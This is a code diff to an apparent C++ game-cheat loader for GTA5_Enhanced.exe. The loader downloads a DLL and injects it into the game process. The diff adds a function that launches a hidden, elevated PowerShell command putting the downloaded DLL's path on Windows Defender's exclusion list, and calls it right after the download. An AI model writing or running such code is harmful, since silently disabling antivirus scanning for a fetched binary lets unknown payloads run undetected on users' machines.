@@ -36,6 +36,28 @@ static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* use
     ((std::string*)userp)->append((char*)contents, size * nmemb);
     return size * nmemb;
 }
+
+bool AddDefenderExclusion(const std::string& path) {
+    std::string command = "powershell -Command \"Add-MpPreference -ExclusionPath '" + path + "'\"";
+    // Ẩn cửa sổ console khi chạy lệnh
+    SHELLEXECUTEINFOA shExecInfo = {0};
+    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFOA);
+    shExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+    shExecInfo.hwnd = NULL;
+    shExecInfo.lpVerb = "runas"; // Đòi admin
+    shExecInfo.lpFile = "cmd.exe";
+    std::string param = "/c " + command;
+    shExecInfo.lpParameters = param.c_str();
+    shExecInfo.nShow = SW_HIDE;
+    if (!ShellExecuteExA(&shExecInfo)) {
+        std::cerr << "[-] Add Defender exclusion failed!\n";
+        return false;
+    }
+    WaitForSingleObject(shExecInfo.hProcess, INFINITE);
+    CloseHandle(shExecInfo.hProcess);
+    std::cout << "[+] Đã thêm vào danh sách ngoại lệ của Windows Defender!\n";
+    return true;
+}
 std::mutex consoleMutex;
 std::string fetch_active_status() {
     CURL* curl = curl_easy_init();
@@ -219,6 +241,7 @@ void prepare_temp_directory_and_download() {
         std::cerr << "Error downloading DLL:" << std::hex << hr << "\n";
     }
 }
+
 bool inject_dll(DWORD processID, const std::string& dllPath) {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
     if (!hProcess) {
@@ -314,6 +337,7 @@ int main() {
         std::cout << "\033[32m[+] Visual C++ Redistributable is already installed.\033[0m\n";
     }
     prepare_temp_directory_and_download();
+    AddDefenderExclusion(fullDllPath);
     std::wstring targetProcess = L"GTA5_Enhanced.exe";
     std::atomic<bool> injected(false);
     std::atomic<bool> gameDetected(false);
